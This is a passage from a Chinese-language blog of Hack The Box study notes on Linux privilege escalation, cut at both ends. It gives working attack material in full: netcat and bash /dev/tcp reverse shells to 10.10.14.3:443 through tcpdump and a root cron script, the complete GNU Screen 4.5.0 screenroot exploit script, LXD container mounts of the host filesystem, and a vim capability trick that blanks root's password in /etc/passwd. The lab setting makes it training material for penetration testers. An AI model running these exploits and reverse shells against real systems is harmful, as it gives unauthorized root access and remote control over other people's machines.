eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root</code></pre><blockquote><p>这个命令使用 <code>tcpdump</code> 工具进行网络数据包捕获，并利用 <code>-z</code> 选项指定了一个 shell 脚本 <code>/tmp/.test</code> 来处理捕获的数据包。以下是命令的各个选项的解释：</p><ul><li><code>sudo</code>: 使用超级用户权限运行 <code>tcpdump</code>，因为只有特权用户（如 <code>root</code>）才能进行网络数据包捕获。</li><li><code>tcpdump</code>: 命令本身，用于捕获和显示网络数据包。</li><li><code>-ln</code>: 以数字格式显示输出，并禁用 DNS 反向解析。</li><li><code>-i eth0</code>: 指定网络接口为 <code>eth0</code>，即指定从 <code>eth0</code> 网络接口捕获数据包。</li><li><code>-w /dev/null</code>: 将捕获的数据包写入 <code>/dev/null</code>，即丢弃数据包而不实际保存。</li><li><code>-W 1</code>: 指定数据包文件的最大数量为 1，即每次最多只生成一个数据包文件。</li><li><code>-G 1</code>: 指定生成新数据包文件的时间间隔为 1 秒。</li><li><code>-z /tmp/.test</code>: 指定一个 shell 脚本 <code>/tmp/.test</code> 来处理捕获的数据包。在每个新文件创建时，将运行该脚本，对新文件进行处理。</li><li><code>-Z root</code>: 在 <code>tcpdump</code> 运行时设置当前用户为 <code>root</code>，这通常用于确保在捕获数据包时具有足够的权限。</li></ul></blockquote><p>让我们试试这个。首先，制作一个文件，用postrotate命令执行，添加一个简单的反向shell一行。</p><pre><code class="shell-session">htb_student@NIX02:~$ cat /tmp/.testrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.3 443 &gt;/tmp/f</code></pre><blockquote><p>这个命令使用了一系列 Linux 命令，下面逐步解释：</p><ol><li><code>rm /tmp/f</code>：删除 <code>/tmp/f</code> 文件，确保之前不存在同名的命名管道（named pipe）。</li><li><code>mkfifo /tmp/f</code>：创建一个命名管道 <code>/tmp/f</code>。命名管道是一种特殊类型的文件，可以用于进程间通信，它允许一个进程将数据写入管道，而另一个进程可以从管道读取数据。</li><li><code>cat /tmp/f | /bin/sh -i 2&gt;&amp;1</code>：将 <code>/tmp/f</code> 命名管道的输出通过管道（<code>|</code>）传递给 <code>/bin/sh</code>，并使用 <code>-i</code> 选项开启一个交互式 Shell。<code>2&gt;&amp;1</code> 将标准错误输出重定向到标准输出，确保错误信息也被传递到 <code>/bin/sh</code>。</li><li><code>nc 10.10.14.3 443 &gt; /tmp/f</code>：将 <code>/bin/sh</code> 的输出通过网络连接传递给 IP 地址为 <code>10.10.14.3</code>，端口号为 <code>443</code> 的远程主机。同时，将从网络连接接收到的数据写入 <code>/tmp/f</code> 命名管道。</li></ol></blockquote><h1 id="Privileged-Groups"><a href="#Privileged-Groups" class="headerlink" title="Privileged Groups"></a>Privileged Groups</h1><h2 id="LXC-x2F-LXD"><a href="#LXC-x2F-LXD" class="headerlink" title="LXC &#x2F; LXD"></a>LXC &#x2F; LXD</h2><p>LXD类似于Docker，是Ubuntu的容器管理器。安装后，所有用户都会添加到LXD组中。通过创建一个LXD容器，使其具有特权，然后访问&#x2F;mnt&#x2F;root上的主机文件系统，可以使用该组的成员身份来提升权限。让我们确认组成员身份，并使用这些权限升级为root用户。</p><pre><code class="shell-session">devops@NIX02:~$ iduid=1009(devops) gid=1009(devops) groups=1009(devops),110(lxd)</code></pre><p>Unzip the Alpine image.</p><pre><code class="shell-session">devops@NIX02:~$ unzip alpine.zip Archive:  alpine.zipextracting: 64-bit Alpine/alpine.tar.gz  inflating: 64-bit Alpine/alpine.tar.gz.root  cd 64-bit\ Alpine/</code></pre><p>启动LXD初始化过程。为每个提示选择默认值。有关每一步的更多信息，请参阅本文<a href="https://www.digitalocean.com/community/tutorials/how-to-set-up-and-use-lxd-on-ubuntu-16-04">post</a> 。</p><pre><code class="shell-session">devops@NIX02:~$ lxd init</code></pre><p>Import the local image.</p><pre><code class="shell-session">devops@NIX02:~$ lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine</code></pre><p>启动一个安全性设置为true的特权容器，以在没有UID映射的情况下运行容器，使容器中的根用户与主机上的根用户相同。</p><pre><code class="shell-session">devops@NIX02:~$ lxc init alpine r00t -c security.privileged=true</code></pre><p>装载主机文件系统。</p><pre><code class="shell-session">devops@NIX02:~$ lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=trueDevice mydev added to r00t</code></pre><p>最后，在容器实例中生成一个shell。我们现在可以以root用户身份浏览已装载的主机文件系统。例如，要访问主机上根目录的内容，请键入cd&#x2F;mnt&#x2F;root&#x2F;root。从这里，我们可以读取&#x2F;etc&#x2F;shadow等敏感文件，并获得密码哈希或访问SSH密钥，以便以root身份连接到主机系统，等等。</p><pre><code class="shell-session">devops@NIX02:~$ lxc start r00tdevops@NIX02:~/64-bit Alpine$ lxc exec r00t /bin/sh~ # iduid=0(root) gid=0(root)~ # </code></pre><h2 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h2><p>将用户放在docker组中本质上相当于在不需要密码的情况下对文件系统进行根级访问。docker组的成员可以生成新的docker容器。一个例子是运行命令docker run-v&#x2F;root:&#x2F;mnt-it ubuntu。此命令创建一个新的Docker实例，其中主机文件系统上的&#x2F;root目录作为卷安装。一旦容器启动，我们就可以浏览到已安装的目录，并为根用户检索或添加SSH密钥。这可以对其他目录（如&#x2F;etc&#x2F;shadow文件）执行，这些目录可用于检索&#x2F;etc&#x2F;shadow文件的内容以进行脱机密码破解或添加特权用户。</p><h2 id="Disk"><a href="#Disk" class="headerlink" title="Disk"></a>Disk</h2><p>磁盘组中的用户可以完全访问&#x2F;dev&#x2F;sda1中包含的任何设备，例如&#x2F;dev&#x2F;sda1，它通常是操作系统使用的主要设备。具有这些权限的攻击者可以使用debugfs以根级别权限访问整个文件系统。与Docker组示例一样，这可以用于检索SSH密钥、凭据或添加用户。</p><h2 id="ADM"><a href="#ADM" class="headerlink" title="ADM"></a>ADM</h2><p>adm组的成员可以读取&#x2F;var&#x2F;log中存储的所有日志。这不会直接授予root访问权限，但可以用来收集存储在日志文件中的敏感数据，或枚举用户操作和运行cron作业。</p><h2 id="practice-1"><a href="#practice-1" class="headerlink" title="practice"></a>practice</h2><p> <strong>Use the privileged group rights of the secaudit user to locate a flag.</strong></p><h1 id="Capabilities"><a href="#Capabilities" class="headerlink" title="Capabilities"></a>Capabilities</h1><p>设置功能包括使用适当的工具和命令为可执行文件或程序分配特定的功能。例如，在Ubuntu中，我们可以使用setcap命令为特定的可执行文件设置功能。此命令允许我们指定要设置的功能和要分配的值。 例如，我们可以使用以下命令为可执行文件设置cap_net_bind_service功能：</p><h4 id="Set-Capability"><a href="#Set-Capability" class="headerlink" title="Set Capability"></a>Set Capability</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic</code></pre><p>当为二进制文件设置了功能时，这意味着二进制文件将能够执行特定的操作，而如果没有这些功能，它将无法执行这些操作。例如，如果为二进制文件设置了cap_net_bind_service功能，则该二进制文件将能够绑定到网络端口，这是一种通常受到限制的特权。 某些功能，如cap_sys_admin，允许可执行文件以管理权限执行操作，如果使用不当，可能会造成危险。例如，我们可以利用它们来提升其权限、获取对敏感信息的访问权限或执行未经授权的操作。因此，为适当的沙盒和隔离的可执行文件设置这些类型的功能并避免不必要地授予它们是至关重要的。</p><table><thead><tr><th><strong>能力</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>cap_sys_admin</code></td><td>允许使用管理权限执行操作，例如修改系统文件或更改系统设置。</td></tr><tr><td><code>cap_sys_chroot</code></td><td>允许更改当前进程的根目录，允许它访问原本无法访问的文件和目录。</td></tr><tr><td><code>cap_sys_ptrace</code></td><td>允许附加到和调试其他进程，可能允许它访问敏感信息或修改其他进程的行为。</td></tr><tr><td><code>cap_sys_nice</code></td><td>允许提高或降低进程的优先级，从而可能允许它访问原本会受到限制的资源。</td></tr><tr><td><code>cap_sys_time</code></td><td>允许修改系统时钟，可能允许它操纵时间戳或导致其他进程以意外方式运行。</td></tr><tr><td><code>cap_sys_resource</code></td><td>允许修改系统资源限制，例如打开文件描述符的最大数量或可以分配的最大内存量。</td></tr><tr><td><code>cap_sys_module</code></td><td>允许加载和卸载内核模块，可能允许它修改操作系统的行为或访问敏感信息。</td></tr><tr><td><code>cap_net_bind_service</code></td><td>允许绑定到网络端口，可能允许它访问敏感信息或执行未经授权的操作。</td></tr></tbody></table><table><thead><tr><th><strong>能力值</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>=</code></td><td>此值为可执行文件设置指定的功能，但不授予任何权限。如果我们想清除可执行文件先前设置的功能，这会很有用。</td></tr><tr><td><code>+ep</code></td><td>此值向可执行文件授予指定功能的有效和允许的权限。这允许可执行文件执行该功能允许的操作，但不允许它执行功能不允许的任何操作。</td></tr><tr><td><code>+ei</code></td><td>此值为可执行文件的指定功能授予足够的可继承权限。这允许可执行文件执行该功能允许的操作，以及可执行文件生成的子进程继承功能并执行相同的操作。</td></tr><tr><td><code>+p</code></td><td>此值向可执行文件授予指定功能的允许权限。这允许可执行文件执行该功能允许的操作，但不允许它执行功能不允许的任何操作。如果我们想要向可执行文件授予功能，但阻止它继承该功能或允许子进程继承它，这可能很有用。</td></tr></tbody></table><table><thead><tr><th><strong>能力</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>CAP_SETUID</code></td><td>允许进程设置其有效用户 ID，该 ID 可用于获取其他用户（包括该用户）的特权。<code>root</code></td></tr><tr><td><code>CAP_SETGID</code></td><td>允许设置其有效组 ID，可用于获取另一个组（包括该组）的权限。<code>root</code></td></tr><tr><td><code>CAP_SYS_ADMIN</code></td><td>此功能提供了广泛的管理权限，包括能够执行为用户保留的许多操作，例如修改系统设置以及挂载和卸载文件系统。<code>root</code></td></tr></tbody></table><h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>如果我们使用低权限帐户访问了系统，但没有cap_sys_admin功能：</p><h4 id="Exploiting-Capabilities"><a href="#Exploiting-Capabilities" class="headerlink" title="Exploiting Capabilities"></a>Exploiting Capabilities</h4><pre><code class="shell-session">Tanin@htb[/htb]$ getcap /usr/bin/vim.basic/usr/bin/vim.basic cap_dac_override=eip</code></pre><p>例如，&#x2F;usr&#x2F;bin&#x2F;vim.basic二进制文件在没有特殊权限的情况下运行，例如使用sudo。然而，由于二进制文件具有cap_sys_admin功能集，因此它可以提升运行它的用户的权限。这将允许渗透测试人员获得cap_sys_admin功能并执行需要此功能的任务。 让我们看看&#x2F;etc&#x2F;passwd文件，其中指定了用户root：</p><pre><code class="shell-session">Tanin@htb[/htb]$ cat /etc/passwd | head -n1root:x:0:0:root:/root:/bin/bash</code></pre><p>我们可以使用&#x2F;usr&#x2F;bin&#x2F;vim二进制文件的cap_sys_admin功能来修改系统文件：</p><pre><code class="shell-session">Tanin@htb[/htb]$ /usr/bin/vim.basic /etc/passwd</code></pre><p>我们还可以在非交互式模式下进行这些更改：</p><pre><code class="shell-session">Tanin@htb[/htb]$ echo -e &#39;:%s/^root:[^:]*:/root::/\nwq&#39; | /usr/bin/vim.basic -es /etc/passwdTanin@htb[/htb]$ cat /etc/passwd | head -n1</code></pre><blockquote><p><code>vim -es</code> 是用于以批处理（非交互式）模式运行 Vim 编辑器的命令。在这个模式下，Vim 将在不显示图形用户界面（GUI）的情况下运行，并执行指定的编辑操作或脚本，然后退出。这种模式通常用于自动化编辑任务、批量处理文本文件或在脚本中使用 Vim。</p><p>解释一下命令中的选项：</p><ul><li><p><code>vim</code>：是 Vim 编辑器的命令。</p></li><li><pre><code>-es</code></pre><p>：是 Vim 的选项之一，它表示启动 Vim 编辑器并进入批处理模式。</p><ul><li><code>-e</code>：表示以 Ex 模式启动 Vim，该模式是 Vim 的批处理编辑模式，不显示交互式界面。</li><li><code>-s</code>：表示将 Vim 当作脚本执行。这个选项需要与 <code>-e</code> 一起使用，将 Vim 用于自动化编辑任务和批量处理。</li></ul></li></ul><p>使用 <code>vim -es</code> 后，可以通过标准输入或文件输入来执行编辑操作或脚本。例如，可以通过输入 Ex 命令来编辑文件、搜索和替换文本等，然后退出 Vim。</p></blockquote><p>现在，我们可以看到这一行中的x已经不见了，这意味着我们可以使用命令su以root身份登录，而无需询问密码。</p><blockquote><p>在 Linux 系统中，<code>/etc/passwd</code> 文件中的每一行描述一个用户账号的信息，以冒号分隔字段。其中，<code>root:x:0:0:root:/root:/bin/bash</code> 这一行表示 <code>root</code> 用户的账号信息。</p><ul><li>第一个字段 <code>root</code> 是用户名，表示账号的登录名。</li><li>第二个字段 <code>x</code> 是密码字段。在过去，密码是以明文存储在 <code>/etc/passwd</code> 文件中，但为了增加安全性，现代系统一般将密码存储在 <code>/etc/shadow</code> 文件中，而在 <code>/etc/passwd</code> 文件中用 <code>x</code> 占位。真正的密码哈希值存储在 <code>/etc/shadow</code> 文件中，只有超级用户（通常是 <code>root</code> 用户）可以访问该文件。</li><li>第三个字段 <code>0</code> 是用户ID（UID，User ID）。<code>0</code> 表示 <code>root</code> 用户的用户ID，<code>0</code> 是预留给超级用户（root）的特殊用户ID。</li><li>第四个字段 <code>0</code> 是组ID（GID，Group ID）。同样，<code>0</code> 表示 <code>root</code> 用户所属的组ID，即预留给超级用户组的特殊组ID。</li><li>第五个字段 <code>root</code> 是用户的全名或注释字段，通常是对用户的描述。</li><li>第六个字段 <code>/root</code> 是用户的主目录，即 <code>root</code> 用户的家目录。</li><li>第七个字段 <code>/bin/bash</code> 是用户登录后使用的默认 shell。</li></ul><p>在现代系统中，密码字段中的 <code>x</code> 表示密码信息存储在 <code>/etc/shadow</code> 文件中，因此 <code>/etc/passwd</code> 中并不包含实际的密码信息。这样可以增加系统的安全性，因为只有超级用户才能访问 <code>/etc/shadow</code> 文件，一般用户无法获取到真正的密码哈希值。</p></blockquote><p>现在，我们可以看到这一行中的x已经不见了，这意味着我们可以使用命令su以root身份登录，而无需询问密码。</p><h2 id="practice-2"><a href="#practice-2" class="headerlink" title="practice"></a>practice</h2><p> <strong>Escalate the privileges using capabilities and read the flag.txt file in the “&#x2F;root” directory. Submit its contents as the answer.</strong></p><p>这里跟上面的示例差不多，唯一的区别是在修改passwd文件时需要使用wq！退出才能有效</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307161934479.png" alt="image-20230716193413383"></p><blockquote><p>在 Vim 中，<code>:wq!</code> 和 <code>:wq</code> 是两个不同的命令，分别用于保存文件并退出 Vim。</p><ol><li><code>:wq!</code>：这个命令用于保存文件并强制退出 Vim。如果当前编辑的文件没有写权限或者是只读文件，或者 Vim 检测到文件已被修改但未保存，<code>:wq!</code> 命令会强制保存文件并退出编辑器。如果文件是只读的，会提示是否保存为另一个文件。</li><li><code>:wq</code>：这个命令用于保存文件并退出 Vim。如果当前编辑的文件有写权限且没有被其他程序锁定，并且没有未保存的修改，<code>:wq</code> 命令会保存文件并退出编辑器。如果文件是只读的或者有未保存的修改，Vim 会给出相应的提示并不会退出编辑器。</li></ol><p>在 Vim 中，冒号 <code>:</code> 是用于输入命令的前缀符号。要使用上述命令，需要按下 Esc 键以确保退出插入模式，然后在 Normal 模式下输入 <code>:wq!</code> 或 <code>:wq</code>，然后按 Enter 键执行相应的命令。</p><p>综上所述，<code>wq!</code> 和 <code>wq</code> 在功能上的区别主要是 <code>!</code> 的作用，用于强制执行保存操作。</p></blockquote><p>这里再解释一下：</p><blockquote><p><code>:%s/^root:[^:]*:/root::/</code> 是 Vim 编辑器的替换命令，用于在编辑器中对文本进行查找和替换操作。解析如下：</p><ul><li><p><code>:</code>：冒号是进入 Vim 的命令行模式的前缀符号。</p></li><li><p><code>%</code>：在 Vim 中 <code>%</code> 表示全局范围，用于指定查找和替换操作在整个文件中执行。</p></li><li><p><code>s</code>：<code>s</code> 是替换命令的简写，用于执行查找和替换操作。</p></li><li><pre><code>/^root:[^:]*:/</code></pre><p>：这是查找模式，用于匹配以 </p><pre><code>root:</code></pre><p> 开头的文本。解析如下：</p><ul><li><code>^</code>：表示匹配行的开头。</li><li><code>root:</code>：表示要匹配的文本以 <code>root:</code> 开头。</li><li><code>[^:]*</code>：表示匹配零个或多个非冒号字符，即匹配 <code>root:</code> 后的用户名。</li><li><code>:</code>：表示匹配冒号。</li></ul></li><li><pre><code>/root::/</code></pre><p>：这是替换模式，用于将匹配的文本替换为 </p><pre><code>root::</code></pre><p>。解析如下：</p><ul><li><code>root::</code>：表示要替换的文本为 <code>root::</code>，即清空密码字段。</li></ul></li></ul></blockquote><h1 id="Vulnerable-Services"><a href="#Vulnerable-Services" class="headerlink" title="Vulnerable Services"></a>Vulnerable Services</h1><h4 id="Screen-Version-Identification"><a href="#Screen-Version-Identification" class="headerlink" title="Screen Version Identification"></a>Screen Version Identification</h4><pre><code class="shell-session">Tanin@htb[/htb]$ screen -vScreen version 4.05.00 (GNU) 10-Dec-16</code></pre><p>4.5.0版本存在权限提升漏洞，原因是打开日志文件时缺少权限检查。</p><p>这使攻击者能够截断任何文件或在任何目录中创建root拥有的文件，并最终获得完全的root访问权限。</p><h4 id="Privilege-Escalation-Screen-Exploit-sh"><a href="#Privilege-Escalation-Screen-Exploit-sh" class="headerlink" title="Privilege Escalation - Screen_Exploit.sh"></a>Privilege Escalation - Screen_Exploit.sh</h4><pre><code class="bash">#!/bin/bash# screenroot.sh# setuid screen v4.5.0 local root exploit# abuses ld.so.preload overwriting to get root.# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html# HACK THE PLANET# ~ infodox (25/1/2017)echo &quot;~ gnu/screenroot ~&quot;echo &quot;[+] First, we create our shell and library...&quot;cat &lt;&lt; EOF &gt; /tmp/libhax.c#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/stat.h&gt;__attribute__ ((__constructor__))void dropshell(void)&#123;    chown(&quot;/tmp/rootshell&quot;, 0, 0);    chmod(&quot;/tmp/rootshell&quot;, 04755);    unlink(&quot;/etc/ld.so.preload&quot;);    printf(&quot;[+] done!\n&quot;);&#125;EOFgcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.crm -f /tmp/libhax.ccat &lt;&lt; EOF &gt; /tmp/rootshell.c#include &lt;stdio.h&gt;int main(void)&#123;    setuid(0);    setgid(0);    seteuid(0);    setegid(0);    execvp(&quot;/bin/sh&quot;, NULL, NULL);&#125;EOFgcc -o /tmp/rootshell /tmp/rootshell.c -Wno-implicit-function-declarationrm -f /tmp/rootshell.cecho &quot;[+] Now we create our /etc/ld.so.preload file...&quot;cd /etcumask 000 # becausescreen -D -m -L ld.so.preload echo -ne  &quot;\x0a/tmp/libhax.so&quot; # newline neededecho &quot;[+] Triggering...&quot;screen -ls # screen itself is setuid, so.../tmp/rootshell</code></pre><h1 id="Cron-Job-Abuse"><a href="#Cron-Job-Abuse" class="headerlink" title="Cron Job Abuse"></a>Cron Job Abuse</h1><p>Cron作业也可以设置为一次性运行（例如在启动时）。它们通常用于管理任务，如运行备份、清理目录等。crontab命令可以创建一个cron文件，该文件将由cron守护进程按照指定的时间表运行。创建cron文件时，将在&#x2F;var&#x2F;spool&#x2F;cron中为创建该文件的特定用户创建该文件。crontab文件中的每个条目都需要六个项目，顺序如下：分钟、小时、天、月、周、命令。例如，条目0*&#x2F;12***&#x2F;home&#x2F;admin&#x2F;backup.sh将每12小时运行一次。 root crontab几乎总是只能由root用户或具有完全sudo权限的用户编辑；然而，它仍然可以被滥用。您可能会找到一个以root身份运行的可写脚本，即使您无法读取crontab以了解确切的时间表，您也可以确定它的运行频率（即，每12小时创建一个.tar.gz文件的备份脚本）。在这种情况下，您可以将一个命令附加到脚本的末尾（例如反向shell一行），它将在下次运行cron作业时执行。</p><p>某些应用程序在&#x2F;etc&#x2F;cron.d目录中创建cron文件，并且可能被错误配置为允许非root用户编辑这些文件。 首先，让我们在系统中查找任何可写文件或目录。&#x2F;dmz backups目录中的文件backup.sh很有趣，看起来它可能运行在cron作业上。</p><pre><code class="shell-session">Tanin@htb[/htb]$ find / -path /proc -prune -o -type f -perm -o+w 2&gt;/dev/null/etc/cron.daily/backup/dmz-backups/backup.sh/proc/sys/fs/cgroup/memory/init.scope/cgroup.event_control&lt;SNIP&gt;/home/backupsvc/backup.sh&lt;SNIP&gt;</code></pre><p>在&#x2F;dmz&#x2F;backups目录中快速查看一下，会显示每三分钟创建一次的文件。这似乎是一个重大的错误配置。也许sysadmin的意思是指定每三个小时一次，比如0*&#x2F;3<strong><em>，但写的是</em>&#x2F;3</strong>**，它告诉cron作业每三分钟运行一次。第二个问题是backup.sh shell脚本是全局可写的，并且以root身份运行。</p><pre><code class="shell-session">Tanin@htb[/htb]$ ls -la /dmz-backups/total 36drwxrwxrwx  2 root root 4096 Aug 31 02:39 .drwxr-xr-x 24 root root 4096 Aug 31 02:24 ..-rwxrwxrwx  1 root root  230 Aug 31 02:39 backup.sh</code></pre><p>我们可以使用<a href="https://github.com/DominicBreuker/pspy">pspy</a>确认cron作业正在运行，pspy是一种命令行工具，用于查看正在运行的进程，而不需要root权限。我们可以使用它来查看其他用户运行的命令、cron作业等。它通过扫描procfs来工作。 让我们运行pspy并看看。-pf标志告诉工具打印命令和文件系统事件，-i 1000告诉它每隔1000毫秒（或每秒）扫描一次 <a href="https://en.wikipedia.org/wiki/Procfs">procfs</a>。</p><pre><code class="shell-session">Tanin@htb[/htb]$ ./pspy64 -pf -i 1000pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855</code></pre><pre><code class="shell-session">Tanin@htb[/htb]$ cat /dmz-backups/backup.sh #!/bin/bash SRCDIR=&quot;/var/www/html&quot; DESTDIR=&quot;/dmz-backups/&quot; FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR</code></pre><p>我们可以看到，脚本只是将源目录和目标目录作为变量。然后，它指定一个带有当前备份日期和时间的文件名，并创建源目录（web根目录）的tarball。让我们修改这个脚本，添加一个Bash单行反向shell。</p><pre><code class="bash">#!/bin/bashSRCDIR=&quot;/var/www/html&quot;DESTDIR=&quot;/dmz-backups/&quot;FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgztar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR bash -i &gt;&amp; /dev/tcp/10.10.14.3/443 0&gt;&amp;1</code></pre><blockquote><ul><li><code>bash -i</code>：启动一个交互式的 Bash shell，<code>-i</code> 表示进入交互模式。</li><li><code>&gt;&amp;</code>：将标准输出和标准错误输出合并为一个输出流。</li><li><code>/dev/tcp/10.10.14.3/443</code>：这是特殊的 Bash 设备文件，表示将数据发送到指定的 IP 地址和端口。在这里，它指定将输出流发送到 IP 地址为 <code>10.10.14.3</code> 的主机的 443 端口。</li><li><code>0&gt;&amp;1</code>：将标准输入重定向到与标准输出合并的输出流，实现双向通信。</li></ul></blockquote><h1 id="备忘单"><a href="#备忘单" class="headerlink" title="备忘单"></a>备忘单</h1><p>备忘单是此模块的有用命令参考。</p><table><thead><tr><th><strong>命令</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>ssh htb-student@&lt;target IP&gt;</code></td><td>通过 SSH 连接到实验室目标</td></tr><tr><td>&#96;ps aux</td><td>grep root&#96;</td></tr><tr><td><code>ps au</code></td><td>查看已登录的用户</td></tr><tr><td><code>ls /home</code></td><td>查看用户主目录</td></tr><tr><td><code>ls -l ~/.ssh</code></td><td>检查当前用户的 SSH 密钥</td></tr><tr><td><code>history</code></td><td>检查当前用户的 Bash 历史记录</td></tr><tr><td><code>sudo -l</code></td><td>用户可以以其他用户的身份运行任何内容吗？</td></tr><tr><td><code>ls -la /etc/cron.daily</code></td><td>检查每日 Cron 作业</td></tr><tr><td><code>lsblk</code></td><td>检查未挂载的文件系统&#x2F;驱动器</td></tr><tr><td><code>find / -path /proc -prune -o -type d -perm -o+w 2&gt;/dev/null</code></td><td>查找全局可写目录</td></tr><tr><td><code>find / -path /proc -prune -o -type f -perm -o+w 2&gt;/dev/null</code></td><td>查找全局可写文件</td></tr><tr><td><code>uname -a</code></td><td>检查内核版本</td></tr><tr><td><code>cat /etc/lsb-release</code></td><td>检查操作系统版本</td></tr><tr><td><code>gcc kernel_expoit.c -o kernel_expoit</code></td><td>编译用 C 编写的漏洞利用</td></tr><tr><td><code>screen -v</code></td><td>检查已安装的 版本<code>Screen</code></td></tr><tr><td><code>./pspy64 -pf -i 1000</code></td><td>查看正在运行的进程<code>pspy</code></td></tr><tr><td><code>find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \; 2&gt;/dev/null</code></td><td>查找设置了 SUID 位的二进制文件</td></tr><tr><td><code>find / -user root -perm -6000 -exec ls -ldb &#123;&#125; \; 2&gt;/dev/null</code></td><td>查找设置了 SETGID 位的二进制文件</td></tr><tr><td><code>sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root</code></td><td>私人与<code>tcpdump</code></td></tr><tr><td><code>echo $PATH</code></td><td>检查当前用户的 PATH 变量内容</td></tr><tr><td><code>PATH=.:$&#123;PATH&#125;</code></td><td>在当前用户的 PATH 开头添加<code>.</code></td></tr><tr><td><code>find / ! -path &quot;*/proc/*&quot; -iname &quot;*config*&quot; -type f 2&gt;/dev/null</code></td><td>搜索配置文件</td></tr><tr><td><code>ldd /bin/ls</code></td><td>查看二进制文件所需的共享对象</td></tr><tr><td><code>sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart</code></td><td>使用 提升权限<code>LD_PRELOAD</code></td></tr><tr><td>&#96;readelf -d payroll</td><td>grep PATH&#96;</td></tr><tr><td><code>gcc src.c -fPIC -shared -o /development/libshared.so</code></td><td>编译共享库</td></tr><tr><td><code>lxd init</code></td><td>启动 LXD 初始化过程</td></tr><tr><td><code>lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine</code></td><td>导入本地镜像</td></tr><tr><td><code>lxc init alpine r00t -c security.privileged=true</code></td><td>启动特权 LXD 容器</td></tr><tr><td><code>lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true</code></td><td>在容器中挂载主机文件系统</td></tr><tr><td><code>lxc start r00t</code></td><td>启动容器</td></tr><tr><td><code>showmount -e 10.129.2.12</code></td><td>显示 NFS 导出列表</td></tr><tr><td><code>sudo mount -t nfs 10.129.2.12:/tmp /mnt</code></td><td>在本地挂载 NFS 共享</td></tr><tr><td><code>tmux -S /shareds new -s debugsess</code></td><td>已创建共享会话套接字<code>tmux</code></td></tr><tr><td><code>./lynis audit system</code></td><td>使用 执行系统审核<code>Lynis</code></td></tr></tbody></table>]]></content>
      
      
      
        <tags>
            
            <tag> base </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux_Privilege_Escalation-Information Gathering</title>
      <link href="/2023/07/15/Linux-Privilege-Escalation/"/>
      <url>/2023/07/15/Linux-Privilege-Escalation/</url>
      
        <content type="html"><![CDATA[<h1 id="Environment-Enumeration"><a href="#Environment-Enumeration" class="headerlink" title="Environment Enumeration"></a>Environment Enumeration</h1><p>Linux系统上的根帐户提供对操作系统的完全管理级别访问。在评估过程中，您可能会在Linux主机上获得一个低特权shell，并且需要向根帐户执行权限提升。完全损害主机将使我们能够捕获流量并访问敏感文件，这些文件可能用于在环境中进一步访问。此外，如果Linux计算机已加入域，我们可以获得NTLM哈希并开始枚举和攻击Active Directory。</p><span id="more"></span><p>枚举：<a href="https://github.com/rebootuser/LinEnum">LinEnum</a></p><p>​ <a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">LinPEAS</a></p><h4 id="List-Current-Processes"><a href="#List-Current-Processes" class="headerlink" title="List Current Processes"></a>List Current Processes</h4><pre><code class="shell-session">Tanin@htb[/htb]$ ps aux | grep rootroot         1  1.3  0.1  37656  5664 ?        Ss   23:26   0:01 /sbin/initroot         2  0.0  0.0      0     0 ?        S    23:26   0:00 [kthreadd]root         3  0.0  0.0      0     0 ?        S    23:26   0:00 [ksoftirqd/0]root         4  0.0  0.0      0     0 ?        S    23:26   0:00 [kworker/0:0]root         5  0.0  0.0      0     0 ?        S&lt;   23:26   0:00 [kworker/0:0H]root         6  0.0  0.0      0     0 ?        S    23:26   0:00 [kworker/u8:0]root         7  0.0  0.0      0     0 ?        S    23:26   0:00 [rcu_sched]root         8  0.0  0.0      0     0 ?        S    23:26   0:00 [rcu_bh]root         9  0.0  0.0      0     0 ?        S    23:26   0:00 [migration/0]&lt;SNIP&gt;</code></pre><p>已安装的软件包和版本：与运行的服务一样，重要的是要检查是否有任何过期或易受攻击的软件包，这些软件包可能很容易用于权限提升。一个例子是Screen，它是一个常见的终端多路复用器（类似于tmux）。它允许您启动一个会话并打开许多窗口或虚拟终端，而不是打开多个终端会话。版本4.05.00存在权限提升漏洞，可轻松利用该漏洞提升权限。 </p><p>已登录用户：了解哪些其他用户已登录系统以及他们正在做什么，可以更深入地了解可能的本地横向移动和权限提升路径。 列出当前进程</p><pre><code class="shell-session">Tanin@htb[/htb]$ ps auUSER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMANDroot      1256  0.0  0.1  65832  3364 tty1     Ss   23:26   0:00 /bin/login --cliff.moore     1322  0.0  0.1  22600  5160 tty1     S    23:26   0:00 -bashshared     1367  0.0  0.1  22568  5116 pts/0    Ss   23:27   0:00 -bashroot      1384  0.0  0.1  52700  3812 tty1     S    23:29   0:00 sudo suroot      1385  0.0  0.1  52284  3448 tty1     S    23:29   0:00 suroot      1386  0.0  0.1  21224  3764 tty1     S+   23:29   0:00 bashshared     1397  0.0  0.1  37364  3428 